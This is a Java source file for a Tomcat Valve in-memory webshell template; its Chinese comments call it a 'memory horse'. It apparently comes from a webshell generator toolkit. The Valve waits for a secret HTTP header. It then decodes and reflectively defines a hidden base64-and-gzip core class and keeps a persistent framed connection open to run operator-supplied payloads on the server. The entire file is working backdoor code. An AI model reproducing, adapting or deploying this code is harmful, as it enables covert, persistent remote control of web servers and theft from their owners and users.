package org.leo.jmg.mem.shell.http;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Valve 内存马模板 — HTTPCHUNK 持久连接帧协议版本。
 * <p>
 * 与 {@link LeoValveTpl}（单次请求/响应）不同，此模板在 Header 命中后
 * 进入 while(true) 帧循环，通过同一 HTTP 连接处理多个操作。
 * 帧格式与 {@link LeoFilterChunkTpl} 一致：
 * frameType(1) + transportId(8) + dataLen(4) + data。
 */
public class LeoValveChunkTpl implements Valve {

    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    protected boolean asyncSupported;
    protected Valve next;

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request req, Response resp) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) resp;
        String actualHeader = request.getHeader(headerName);
        if (actualHeader == null || !actualHeader.contains(headerValue)) {
            this.getNext().invoke(req, resp);
            return;
        }

        try {
            response.setStatus(respCode);
            response.setHeader("X-Accel-Buffering", "no");
            response.setHeader("Connection", "keep-alive");
            response.setContentType("application/octet-stream");
            response.setBufferSize(8192);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            try {
                Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
            } catch (ClassNotFoundException e) {
                GZIPInputStream gzipInputStream = new GZIPInputStream(
                        new ByteArrayInputStream(base64Decode(coreClass)));
                while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
                        "defineClass",
                        new Class[]{String.class, byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
                        new Object[]{null, byteArrayOutputStream.toByteArray(),
                                Integer.valueOf(0), Integer.valueOf(byteArrayOutputStream.size())});
            }

            DataInputStream dataInputStream = new DataInputStream(request.getInputStream());
            DataOutputStream dataOutputStream = new DataOutputStream(response.getOutputStream());
            dataOutputStream.flush();

            while (true) {
                int frameType = dataInputStream.readUnsignedByte();
                long transportId = dataInputStream.readLong();
                int dataLen = dataInputStream.readInt();
                if (dataLen < 0 || dataLen > 16777216) break;
                byte[] data = new byte[dataLen];
                dataInputStream.readFully(data);
                if (frameType == 4) break;
                if (frameType == 3) continue;
                int responseType;
                byte[] respData;
                if (frameType == 2 && dataLen == 0) {
                    responseType = 3;
                    respData = new byte[0];
                } else if (frameType == 1) {
                    responseType = 1;
                    byteArrayOutputStream = new ByteArrayOutputStream();
                    byteArrayOutputStream.write(data);
                    try {
                        ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader())
                                .newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
                    } catch (Throwable e) {
                        throw new IllegalStateException("Core invocation failed", e);
                    }
                    respData = byteArrayOutputStream.toByteArray();
                } else {
                    break;
                }
                if (respData.length > 16777216) break;
                dataOutputStream.writeByte(responseType);
                dataOutputStream.writeLong(transportId);
                dataOutputStream.writeInt(respData.length);
                dataOutputStream.write(respData);
                dataOutputStream.flush();
            }
        } catch (Exception ignored) {
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                    .invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, str);
        }
    }
}
